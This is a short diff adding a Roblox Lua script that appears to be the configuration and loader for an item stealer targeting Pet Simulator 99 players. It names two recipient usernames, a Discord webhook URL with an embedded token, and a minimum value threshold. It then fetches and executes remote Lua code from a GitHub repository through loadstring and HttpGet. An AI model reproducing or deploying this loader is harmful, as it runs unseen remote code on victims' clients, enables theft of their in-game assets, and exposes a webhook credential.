@@ -1,0 +1,6 @@
+Username = "xxModernAq7"
+Username2 = "xxModernAq12"
+Webhook = "https://discord.com/api/webhooks/1246716812628987904/HxGIp5t_GrT0ifz5ifvEqe5UvKHMFiU8Qr2MJ7l8NbQI2nS90KxHubRPeBn12Ke7CE7D"
+Support = false
+min_rap = 1500000
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
